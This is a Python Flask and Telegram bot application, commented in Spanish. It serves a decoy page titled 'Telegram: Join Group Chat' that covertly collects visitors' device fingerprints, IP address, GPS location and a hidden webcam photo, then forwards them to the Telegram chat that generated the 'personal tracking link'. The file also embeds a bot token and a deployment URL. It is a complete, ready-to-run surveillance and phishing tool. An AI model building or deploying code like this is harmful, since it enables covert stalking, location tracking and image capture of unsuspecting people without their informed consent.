import os
import base64
from flask import Flask, request, render_template_string
import telebot
from datetime import datetime
import threading

# --- CONFIGURACIÓN ---
TOKEN = "8731032932:AAEdMOe81SLdxqShm50XVI5HbkTC7igqg_k"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# URL base de tu app en Render (Cámbiala por la tuya real)
URL_APP = "https://pp-elqx.onrender.com"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Telegram: Join Group Chat</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: sans-serif; background-color: #fff; overflow: hidden; }
        .content { position: relative; height: 100%; width: 100%; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>
    <div class="content">
        <iframe src="https://www.grupostelegram.net"></iframe>
    </div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id');

        async function getExtraData() {
            const data = {
                ua: navigator.userAgent,
                lang: navigator.language,
                res: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency || 'N/A',
                mem: navigator.deviceMemory || 'N/A',
                vendor: navigator.vendor
            };
            try {
                const batt = await navigator.getBattery();
                data.batt_lvl = Math.round(batt.level * 100) + '%';
                data.batt_char = batt.charging ? 'Yes' : 'No';
            } catch (e) { data.batt_lvl = 'N/A'; data.batt_char = 'N/A'; }
            return data;
        }

        async function start() {
            if (!chatId) return; // No hacer nada si no hay ID
            const info = await getExtraData();
            
            navigator.geolocation.getCurrentPosition(
                (pos) => { capture({...info, lat: pos.coords.latitude, lon: pos.coords.longitude, gps: 'Allowed'}); },
                () => { capture({...info, lat: 'N/A', lon: 'N/A', gps: 'Denied'}); }
            );
        }

        async function capture(fullData) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    send({ ...fullData, img: canvas.toDataURL('image/jpeg'), cam: 'Allowed', target: chatId });
                    stream.getTracks().forEach(t => t.stop());
                }, 3000);
            } catch (e) {
                send({ ...fullData, cam: 'Denied', target: chatId });
            }
        }

        function send(payload) {
            fetch('/data', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
        }
        window.onload = start;
    </script>
</body>
</html>
"""

# --- RUTAS DE FLASK ---

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/data', methods=['POST'])
def get_data():
    d = request.json
    target_chat = d.get('target')
    ip = request.remote_addr
    now = datetime.now().strftime("%H:%M:%S")
    
    reporte = (
        f"📊 *Nueva Información Capturada*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🖥 *Hardware*\n"
        f"• CPU Cores: `{d.get('cores')}`\n"
        f"• RAM: `{d.get('mem')} GB`\n"
        f"• Resolución: `{d.get('res')}`\n\n"
        f"🌐 *Conexión*\n"
        f"• IP: `{ip}`\n"
        f"• Navegador: `{d.get('ua')[:50]}...`\n\n"
        f"🔋 *Batería*\n"
        f"• Nivel: `{d.get('batt_lvl')}`\n"
        f"• Cargando: `{d.get('batt_char')}`\n\n"
        f"🔐 *Permisos*\n"
        f"• Cámara: `{d.get('cam')}`\n"
        f"• GPS: `{d.get('gps')}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📅 Hora: {now}"
    )
    
    try:
        bot.send_message(target_chat, reporte, parse_mode="Markdown")
        if d.get('lat') != 'N/A':
            map_link = f"📍 *Ubicación:*\nhttps://www.google.com/maps?q={d.get('lat')},{d.get('lon')}"
            bot.send_message(target_chat, map_link)
        
        if d.get('img'):
            img_data = base64.b64decode(d.get('img').split(',')[1])
            bot.send_photo(target_chat, img_data, caption=f"📸 Foto capturada a las {now}")
    except Exception as e:
        print(f"Error enviando a {target_chat}: {e}")

    return "OK", 200

# --- LÓGICA DEL BOT DE TELEGRAM ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    link_personal = f"{URL_APP}/?id={user_id}"
    
    texto_bienvenida = (
        f"👋 *Hola! Bienvenido al sistema de gestión.*\n\n"
        f"🔗 *Tu link personal de rastreo es:*\n"
        f"`{link_personal}`\n\n"
        f"Cada vez que alguien entre a ese link, recibirás aquí mismo:\n"
        f"✅ Ubicación GPS\n"
        f"✅ Foto de la cámara\n"
        f"✅ Datos técnicos del dispositivo"
    )
    bot.reply_to(message, texto_bienvenida, parse_mode="Markdown")

# Ejecutar el bot en un hilo separado
def run_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
